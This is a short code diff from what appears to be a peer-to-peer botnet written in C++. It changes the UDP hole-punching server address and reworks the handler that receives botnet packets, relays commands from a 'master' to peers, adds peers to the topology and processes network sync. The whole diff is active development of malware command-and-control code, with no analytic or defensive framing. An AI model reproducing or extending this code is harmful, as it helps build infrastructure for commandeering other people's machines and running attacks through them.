@@ -115,7 +115,7 @@ void peer_request()
 	/* destination */
 	server.sin_family = AF_INET;
 	server.sin_port = htons(HOLE_PUNCHING_SERVER_PORT);
-	inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);
+	inet_pton(AF_INET, "192.168.8.2", &server.sin_addr);
 
 	/* send request */
 	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
@@ -126,22 +126,23 @@ void peer_request()
 static void handle_udp_connections()
 {
 	/* locals */
-	struct botnet_pack p;
+	u_char data[1024];
+	struct botnet_pack* p = (struct botnet_pack*)data;
 	struct sockaddr_in client;
 	int client_size = sizeof(client);
 
 	/* recv packet */
-	recvfrom(udp_sock, (char*)&p, 1024, 0, (struct sockaddr*)&client, &client_size);
+	recvfrom(udp_sock, (char*)data, 1024, 0, (struct sockaddr*)&client, &client_size);
 	
 	for (size_t i = 0; i < adapters_count; i++)
 		if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
 			return;
 	
-	switch (p.type)
+	switch (p->type)
 	{
 	case PACK_TYPE::COMMAND:
 		master = client;
-		send_command((u_char*)&p, BOTNET_PACK_SIZE);
+		send_command(data, BOTNET_PACK_SIZE);
 		break;
 	case PACK_TYPE::COMMAND_RESULT:
 		break;
@@ -151,10 +152,10 @@ static void handle_udp_connections()
 	case PACK_TYPE::SYNC_REPLY:
 		break;
 	case PACK_TYPE::PEER_REPLY:
-		botnet_topology.addPeer(p, udp_sock);
+		botnet_topology.addPeer(*p, udp_sock);
 		break;
 	case PACK_TYPE::NETWORK_SYNC:
-		botnet_topology.handleSync(p);
+		botnet_topology.handleSync(data);
 		break;
 	}
 }
